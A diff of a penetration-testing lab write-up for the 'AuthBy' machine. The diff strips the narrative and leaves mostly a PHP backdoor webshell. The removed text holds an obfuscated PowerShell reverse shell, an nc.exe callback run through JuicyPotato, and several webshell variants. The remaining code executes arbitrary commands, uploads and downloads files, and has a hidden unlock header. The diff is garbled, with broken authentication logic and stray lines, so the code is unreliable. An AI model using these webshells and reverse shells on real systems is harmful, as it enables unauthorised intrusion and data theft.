@@ -1,272 +1,27 @@
-# AuthBy Writeup
-
-Name: AuthBy
-Date:  
-Difficulty:  Intermediate
-Goals:  
-- TJNull List OSCP-like machine - return to form
-Learnt:
-- A lot of php 
-Beyond Root:
-- PHP webshell
-
-- [[AuthBy-Notes.md]]
-- [[AuthBy-CMD-by-CMDs.md]]
-
-## Recon
-
-The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
-![ping](Screenshots/ping.png)
-
-Nmap returned anonymous access to the FTP server. A quick brute force of non encrypted FTP allows for both anonymous login and Administrative access to write files to the server.
-![](hydraftp.png)
-## Default Password 
-
-With the default password 
-```
-wget -r ftp://admin:admin@192.168.174.46/
-```
-
-We can then crack the hash in .htpasswd used to restrict access on the web server
-![](htpasswd.png)
-
-This just a MD5 hash 
-![](apache1hash.png)
-
-That leads to being able read and execute uploaded files from the FTP server in the root web directory that requires authentication. 
-![](hashcatcracked.png)
-
-Regardless of using an uncommon port to host a web server we can still access this in simplistic set of step discussed previously.
-![](offseceliteforwebpage.png)
-
-Then uploading a webshell.
-![](webadeshell.png)
-
-https://sushant747.gitbooks.io/total-oscp-guide/content/webshell.html
-
-I ran it into some issues that were easily fixed - it is just accessing the webshell page without providing data for the cmd to execute arbitrary commands on the webserver 
-![](nowebshellsadness.png)
-
-For the beyond root I decided to learn some PHP and cobble together my own webshell:
-![](mademyownwebshellfromothers.png)
-
-The code is here to copy:
-```php
-<html>
-<head>
-<title>Perspective honing persistence</title>
-// Made from simple_cmd.php, simple-backdoor.php
-<body>
-<form method=POST>
-<input type=TEXT name="cmd" size=64 value="<?=$cmd?>"
-<input type=TEXT name="systemRequest" size=64 value="<?=$systemRequest?>"
-<hr>
-</form>
-<?php $cmd = $_REQUEST["cmd"];?>
-<?php if ($cmd != "") { print Shell_Exec($cmd); } else { echo "cmd=";}?>
-<?php
-if(isset($_REQUEST['systemRequest'])){
-        echo "<pre>";
-        $systemRequest = ($_REQUEST['systemRequest']);
-        system($systemRequest);
-        echo "</pre>";
-        die;
-}
-?>
-</body>
-</html>
-```
-
-I could have also used [Online php-obfuscator](https://www.gaijin.at/en/tools/php-obfuscator) from [[Wreath-Writeup]] may also help in adding to discovery.
-```php
-<html>
-<head>
-<title>Perspective honing persistence</title>
-// Made from simple_cmd.php, simple-backdoor.php
-<body>
-<form method=POST>
-<input type=TEXT name="cmd" size=64 value="<?=$edfff0a7fa1a5?>"
-<input type=TEXT name="systemRequest" size=64 value="<?=$k06ca1b7b4ed8?>"
-<hr>
-</form>
-<?php $edfff0a7fa1a5=$_REQUEST[base64_decode('Y21k')];?>
-<?php if($edfff0a7fa1a5!=''){printShell_Exec($edfff0a7fa1a5);}else{echo base64_decode('Y21kPQ==');}?>
-<?php if(isset($_REQUEST[base64_decode('c3lzdGVtUmVxdWVzdA==')])){echo base64_decode('PHByZT4=');$k06ca1b7b4ed8=($_REQUEST[base64_decode('c3lzdGVtUmVxdWVzdA==')]);system($k06ca1b7b4ed8);echo base64_decode('PC9wcmU+');die;}?>
-</body>
-</html>
-```
-
-Running `hostname` on the server
-![](addederrorreportingzero.png)
-
-More improvements to my webshell
-```php
-<html>
-<head>
-<title>Perspective honing persistence</title>
-// Made from simple_cmd.php, simple-backdoor.php
-<body>
-<form method=POST>
-<input type=TEXT name="cmd" size=64 value="<?=$cmd?>"
-<input type=TEXT name="systemRequest" size=64 value="<?=$systemRequest?>"
-<hr>
-</form>
-<?php error_reporting(0);?>
-<?php $cmd = $_REQUEST["cmd"];?>
-<?php if ($cmd != "") { print Shell_Exec($cmd); } else { echo "cmd=";}?>
-<?php
-if(isset($_REQUEST['systemRequest'])){
-        echo "<pre>";
-        $systemRequest = ($_REQUEST['systemRequest']);
-        system($systemRequest);
-        echo "</pre>";
-        die;
-}
-?>
-</body>
-</html>
-
-```
-
-
-Alh4zr3d's obfuscate reverse shell is just this with the variables changed, save this to a .txt file alter variables where required.
-```powershell
-$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-```
-
-He then base64, little endians it: convert it to UTF-16LE, which the Windows Default encoding, encodes it to base64 then removes the newline .
-```bash
-iconv -f ASCII -t UTF-16LE $reverseshell.txt | base64 | tr -d "\n"
-```
-
-Using Powershell did not work. Uploaded nc.exe felt very dirty doing so, but worked.
-![](ncupload.png)
-
-## PrivEsc
-
-The Privilege Escalation is about finding the right exploit for a weird server. It is a weird Server 2008 version that states it is both a x64 and x86 image. 
-![](livda.png)
-
-Uploaded JuicyPotato exploit - [decoder exploit blog](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/) via FTP as presumably for FTP is being used by an administrator to interact with this box so no need for smelling the juiciest of potatoes, which smell very, very bad. 
-![](juicypotato.png)
-
-Forgot that my arsenal was not categorised correctly and uploaded the x64 version, because I am stupid. So used not being able to run `systeminfo`. Also as previously stated it a weird version with OS name even spelt incorrectly.
-![](systeminfo.png)
-
-I will use the BITS CLSID to remind myself of the exploit more than anything:
-```
-{69AD4AEE-51BE-439b-A92C-86AE490E8B30}
-```
-
-Then...reread what is vulnerable and what is not vulnerable and why from various source such as [jlajara](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#genericPotato).
-
-Double checking for the wpad entry
-![](nowpadentry.png)
-
-As per ACTUALLY READING THE INSTRUCTIONS
-![](window2008server.png)
-
-This failed for some reason that lead me to try both versions of PrintSpoofer.exe
-```
-.\potato.exe -ip 127.0.0.1 -cmd "c:\wamp\www\nc.exe 192.168.45.225 6969 -e c:\windows\system32\cmd.exe" -disable_exhaust true -disable_defender true --spoof_host WPAD.EMC.LOCAL
-```
-
-Built my own versions of both x86 and x64 SweetPotato considering [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens) for both [SweetPotato](https://github.com/CCob/SweetPotato) and [PrintSpoofer](https://github.com/itm4n/PrintSpoofer). x64 and x86 version return the same error
-![](neitherx8664-sameerror.png)
-
-But it is not actually running...
-![](itran.png)
-
-Ran wes.py and there are lots of Privilege Escalations to fall back on if required. I am just concern that seImpersonate Privilege is just glaring in the face. Due to the only documentation on any of the github repositories directly mentioning Windows Server 2008. I decided to retry the original. 
-
-Try https://github.com/antonioCoco/RogueWinRM
-
-
-
-## Beyond Root
-
-PHP webshell for Pentesting - does all the techniques and tricks to empirical test which works and which does not to make reporting and remembering a language I can barely say I can use easier.
-
-Started from this webshell.php
-```php
-<?php
-// Made from simple_cmd.php, simple-backdoor.php, php-backdoor.php
-// php-backdoor can upload and download stuff!
-
-
-error_reporting(0);
-$cmd = $_REQUEST["cmd"];
-if ($cmd != ""){ print Shell_Exec($cmd); 
-} else { 
-echo "cmd=";
-}
-
-
-if(isset($_REQUEST['systemRequest'])){
-        echo "<pre>";
-        $systemRequest = ($_REQUEST['systemRequest']);
-        system($systemRequest);
-        echo "</pre>";
-        die;
-}
-// Really want it to state: Perspective Honed Persistence
-// -- The empirical pentest webshell 
-//
-// Print what does and does not work - no include function or  
-// Test the transpiled asp(x) version
-?>
-
-
-<pre><form action="<? echo $PHP_SELF; ?>" METHOD=GET >execute command: <input type="text" name="cmd"><input type="submit" value="go"><hr></form> 
-<form action="<? echo $PHP_SELF; ?>" METHOD=GET >execute command: <input type="text" name="cmd"><input type="submit" value="go"><hr></form> 
-
-http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=/etc on *nix
-or http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win
-</form>
-```
-
-To this multiple commits later:
-```php
 <?php
 // Made bits I liked the look of from  simple_cmd.php, simple-backdoor.php, php-backdoor.php, predator.php, AK-74.php
 // At some point it helps if you like silly names in the early 2000s
 // The reinvented wheel made with love and ChatGpt to
 // php-backdoor can upload and download stuff!
-//
-// Perspective-Honed-Persistence: MWIwNzI3N2QxZTM1MjVkYWI3M2JiMzA4NzcwOWFhZWY6NDBhNjNjNDQ0NWRlNzVkOTY2YmQ5NDk0MGI1ZmJjNDcK
+$auth = 1;
 ob_implicit_flush();
 error_reporting(0);
-ini_set("display_errors", 0);
-$phpVersion = phpversion();
-$user = "1b07277d1e3525dab73bb3087709aaef"; //login = 'badadmin'
+$name = "1b07277d1e3525dab73bb3087709aaef"; //login = 'badadmin'
 $pass = "40a63c4445de75d966bd94940b5fbc47"; //pass  = 'personalhomepagewebshell'
 $headers = getallheaders();
-if (version_compare($phpVersion, "5.0.0", "<")) {
-    if (isset($HTTP_COOKIE_VARS["Perspective-Honed-Persistence"])) {
-        $cookieValue = base64_decode($_COOKIE["Perspective-Honed-Persistence"]);
-        $cookie_parts = explode(":", $cookieValue, 2);
-
-        if (count($cookie_parts) == 2) {
-            $cookie_user = $cookie_parts[0];
-            $cookie_pass = $cookie_parts[1];
-        }
-    } else {
-        if (isset($_COOKIE["Perspective-Honed-Persistence"])) {
-            $cookieValue = base64_decode(
-                $_COOKIE["Perspective-Honed-Persistence"]
-            );
-            list($cookie_user, $cookie_pass) = explode(":", $cookieValue, 2);
-        }
-    }
-
-    if (md5($cookie_user) != $user && md5($cookie_pass) != $pass) {
-        error_reporting(0);
-        ini_set("display_errors", 0);
+$unlockHeader = "Persistence-Honed-Perspective";
+if ($auth == 1) {
+    if (
+        !isset($HTTP_SERVER_VARS["PHP_AUTH_USER"]) &&
+        md5($HTTP_SERVER_VARS["PHP_AUTH_USER"]) != $name &&
+        md5($HTTP_SERVER_VARS["PHP_AUTH_PW"]) != $pass &&
+        !isset($headers[$unlockHeader])
+    ) {
+        $auth = 0;
         header("HTTP/1.0 403 Unauthorized");
         exit("Access Denied");
     }
 } else {
-    error_reporting(0);
     echo '<form action="' . $_SERVER["PHP_SELF"] . '" method="GET">';
     echo 'Execute command: <input type="text" name="cmd"><input type="submit" value="go"><hr>';
     echo "</form>";
@@ -288,163 +43,166 @@ if (version_compare($phpVersion, "5.0.0", "<")) {
     echo "Exfil and Infil:";
     echo " upload : ";
     echo " download : ";
+}
 
-    if (isset($_REQUEST["shell_exec"])) {
-        echo "<pre>";
-        $shell_exec = $_REQUEST["shell_exec"];
-        shell_exec($shell_exec);
-        echo "</pre>";
-        die();
+if (isset($_REQUEST["shell_exec"])) {
+    echo "<pre>";
+    $shell_exec = $_REQUEST["shell_exec"];
+    shell_exec($shell_exec);
+    echo "</pre>";
+    die();
+}
+
+if (isset($_REQUEST["system"])) {
+    echo "<pre>";
+    $system = $_REQUEST["system"];
+    system($system);
+    echo "</pre>";
+    die();
+}
+
+if (isset($_REQUEST["passthru"])) {
+    echo "<pre>";
+    $passthru = $_REQUEST["passthru"];
+    passthru($passthru);
+    echo "</pre>";
+    die();
+}
+
+if (isset($_REQUEST["eval"])) {
+    echo "<pre>";
+    $eval = $_REQUEST["eval"];
+    passthru($eval);
+    echo "</pre>";
+    die();
+}
+
+if (isset($_REQUEST["testcmds"])) {
+    echo "<pre>";
+    $test = testcmds();
+    echo "$test";
+    echo "</pre>";
+    die();
+}
+
+if (isset($_REQUEST["testDevShm"])) {
+    echo "<pre>";
+    $test = testDevShm();
+    echo "$test";
+    echo "</pre>";
+    die();
+}
+
+if (isset($_REQUEST["testperl"])) {
+    echo "<pre>";
+    $test = testperl();
+    echo "$test";
+    echo "</pre>";
+    die();
+}
+
+if (isset($_REQUEST["testgcc"])) {
+    echo "<pre>";
+    $test = testgcc();
+    echo "$test";
+    echo "</pre>";
+    die();
+}
+
+if (isset($_REQUEST["testpython"])) {
+    echo "<pre>";
+    $testpython = testpython();
+    echo "$test";
+    echo "</pre>";
+    die();
+}
+
+if (isset($_REQUEST["testwget"])) {
+    echo "<pre>";
+    $test = testwget();
+    echo "$test";
+    echo "</pre>";
+    die();
+}
+
+if (isset($_REQUEST["testcurl"])) {
+    echo "<pre>";
+    $test = testcurl();
+    echo "$test";
+    echo "</pre>";
+    die();
+}
+
+if (isset($_REQUEST["testGetMicrotime"])) {
+    executeAndDisplay("getmicrotime");
+}
+
+if (isset($_REQUEST["testGetFilePermissions"])) {
+    $path = $_REQUEST["testGetFilePermissionsPath"]; // Adjust the key accordingly
+    executeAndDisplay("getFilePermissions", [$path]);
+}
+
+if (isset($_REQUEST["testGetSystem"])) {
+    executeAndDisplay("getsystem");
+}
+
+if (isset($_REQUEST["testGetServer"])) {
+    executeAndDisplay("getserver");
+}
+
+if (isset($_REQUEST["testGetUser"])) {
+    executeAndDisplay("getuser");
+}
+
+if (isset($_REQUEST["upload"])) {
+    error_reporting(1);
+    if (!isset($_REQUEST["dir"])) {
+        die("Specify a directory!?!");
     }
-
-    if (isset($_REQUEST["system"])) {
-        echo "<pre>";
-        $system = $_REQUEST["system"];
-        system($system);
-        echo "</pre>";
-        die();
+} else {
+    $dir = $_REQUEST["dir"];
+    $fname = $HTTP_POST_FILES["file_name"]["name"];
+    if (
+        !move_uploaded_file(
+            $HTTP_POST_FILES["file_name"]["tmp_name"],
+            $dir . $fname
+        )
+    ) {
+        die("File uploading error.");
     }
+    error_reporting(0);
+    die();
+}
 
-    if (isset($_REQUEST["passthru"])) {
-        echo "<pre>";
-        $passthru = $_REQUEST["passthru"];
-        passthru($passthru);
-        echo "</pre>";
-        die();
-    }
-
-    if (isset($_REQUEST["eval"])) {
-        echo "<pre>";
-        $eval = $_REQUEST["eval"];
-        passthru($eval);
-        echo "</pre>";
-        die();
-    }
-
-    if (isset($_REQUEST["testcmds"])) {
-        echo "<pre>";
-        $test = testcmds();
-        echo "$test";
-        echo "</pre>";
-        die();
-    }
-
-    if (isset($_REQUEST["testDevShm"])) {
-        echo "<pre>";
-        $test = testDevShm();
-        echo "$test";
-        echo "</pre>";
-        die();
-    }
-
-    if (isset($_REQUEST["testperl"])) {
-        echo "<pre>";
-        $test = testperl();
-        echo "$test";
-        echo "</pre>";
-        die();
-    }
-
-    if (isset($_REQUEST["testgcc"])) {
-        echo "<pre>";
-        $test = testgcc();
-        echo "$test";
-        echo "</pre>";
-        die();
-    }
-
-    if (isset($_REQUEST["testpython"])) {
-        echo "<pre>";
-        $testpython = testpython();
-        echo "$test";
-        echo "</pre>";
-        die();
-    }
-
-    if (isset($_REQUEST["testwget"])) {
-        echo "<pre>";
-        $test = testwget();
-        echo "$test";
-        echo "</pre>";
-        die();
-    }
-
-    if (isset($_REQUEST["testcurl"])) {
-        echo "<pre>";
-        $test = testcurl();
-        echo "$test";
-        echo "</pre>";
-        die();
-    }
-
-    if (isset($_REQUEST["testGetMicrotime"])) {
-        executeAndDisplay("getmicrotime");
-    }
-
-    if (isset($_REQUEST["testGetSystem"])) {
-        executeAndDisplay("getsystem");
-    }
-
-    if (isset($_REQUEST["testGetServer"])) {
-        executeAndDisplay("getserver");
-    }
-
-    if (isset($_REQUEST["testGetUser"])) {
-        executeAndDisplay("getuser");
-    }
-
-    if (isset($_REQUEST["upload"])) {
-        error_reporting(1);
-        if (!isset($_REQUEST["dir"])) {
-            die("Specify a directory!?!");
+if (isset($_REQUEST["download"])) {
+    $dir = isset($_REQUEST["dir"]) ? $_REQUEST["dir"] : "";
+    if (!empty($dir)) {
+        $filename = isset($_REQUEST["file_name"]) ? $_REQUEST["file_name"] : "";
+        if (file_exists($dir . $filename)) {
+            header("Content-Description: File Transfer");
+            header("Content-Type: application/octet-stream");
+            header(
+                'Content-Disposition: attachment; filename="' .
+                    basename($filename) .
+                    '"'
+            );
+            header("Expires: 0");
+            header("Cache-Control: must-revalidate");
+            header("Pragma: public");
+            header("Content-Length: " . filesize($dir . $filename));
+            readfile($dir . $filename);
+            exit();
+        } else {
+            die("File does not exist.");
         }
     } else {
-        $dir = $_REQUEST["dir"];
-        $fname = $HTTP_POST_FILES["file_name"]["name"];
-        if (
-            !move_uploaded_file(
-                $HTTP_POST_FILES["file_name"]["tmp_name"],
-                $dir . $fname
-            )
-        ) {
-            die("File uploading error.");
-        }
-        error_reporting(0);
-        die();
+        die("Specify a directory.");
     }
+}
 
-    if (isset($_REQUEST["download"])) {
-        $dir = isset($_REQUEST["dir"]) ? $_REQUEST["dir"] : "";
-        if (!empty($dir)) {
-            $filename = isset($_REQUEST["file_name"])
-                ? $_REQUEST["file_name"]
-                : "";
-            if (file_exists($dir . $filename)) {
-                header("Content-Description: File Transfer");
-                header("Content-Type: application/octet-stream");
-                header(
-                    'Content-Disposition: attachment; filename="' .
-                        basename($filename) .
-                        '"'
-                );
-                header("Expires: 0");
-                header("Cache-Control: must-revalidate");
-                header("Pragma: public");
-                header("Content-Length: " . filesize($dir . $filename));
-                readfile($dir . $filename);
-                exit();
-            } else {
-                die("File does not exist.");
-            }
-        } else {
-            die("Specify a directory.");
-        }
-    }
-
-    if ($_GET["kill"] == "yes") {
-        unlink($_SERVER["SCRIPT_FILENAME"]);
-        echo "<script>alert('Your shell script was successfully deleted!')</script>";
-    }
+if ($_GET["kill"] == "yes") {
+    unlink($_SERVER["SCRIPT_FILENAME"]);
+    echo "<script>alert('Your shell script was successfully deleted!')</script>";
 }
 
 function getmicrotime()
@@ -453,6 +211,63 @@ function getmicrotime()
     return (float) $usec + (float) $sec;
 }
 
+function getFilePermissions($path)
+{
+    $perms = fileperms($path);
+
+    $permissions = [];
+
+    $permissions[] = (((((($perms & 0xc000
+                                ? "s"
+                                : $perms & 0xa000)
+                            ? "l"
+                            : $perms & 0x8000)
+                        ? "-"
+                        : $perms & 0x6000)
+                    ? "b"
+                    : $perms & 0x4000)
+                ? "d"
+                : $perms & 0x2000)
+            ? "c"
+            : $perms & 0x1000)
+        ? "p"
+        : "u";
+
+    $permissions[] = $perms & 0x0100 ? "r" : "-";
+    $permissions[] = $perms & 0x0080 ? "w" : "-";
+    $permissions[] =
+        $perms & 0x0040
+            ? ($perms & 0x0800
+                ? "s"
+                : "x")
+            : ($perms & 0x0800
+                ? "S"
+                : "-");
+
+    $permissions[] = $perms & 0x0020 ? "r" : "-";
+    $permissions[] = $perms & 0x0010 ? "w" : "-";
+    $permissions[] =
+        $perms & 0x0008
+            ? ($perms & 0x0400
+                ? "s"
+                : "x")
+            : ($perms & 0x0400
+                ? "S"
+                : "-");
+
+    $permissions[] = $perms & 0x0004 ? "r" : "-";
+    $permissions[] = $perms & 0x0002 ? "w" : "-";
+    $permissions[] =
+        $perms & 0x0001
+            ? ($perms & 0x0200
+                ? "t"
+                : "x")
+            : ($perms & 0x0200
+                ? "T"
+                : "-");
+
+    return $permissions;
+}
 function getsystem()
 {
     return php_uname("s") . " " . php_uname("r") . " " . php_uname("v");
@@ -597,8 +412,6 @@ JGRhZW1vbikgewoJCXByaW50ICIkc3RyaW5nXG4iOwoJfQp9Cj8+IAoKCgo=";
         fputs($i = fopen("/tmp/shlbck.php", "w"), base64_decode($php));
         fclose($i);
         $buffer = "";
-        if $patterns = array("/LHOST/" => $ip,"/LPORT/" => $port);
-
         $patterns = [
             "/LHOST/" => $ip,
             "/LPORT/" => $port,
@@ -725,6 +538,7 @@ function testcurl()
     }
 }
 
+
 // use: https://www.gaijin.at/en/tools/php-obfuscator
 ?>
 
@@ -763,4 +577,4 @@ function testcurl()
     <p>Return to <a href="/">Homepage</a></p>
 </body>
 </html>
-```
+
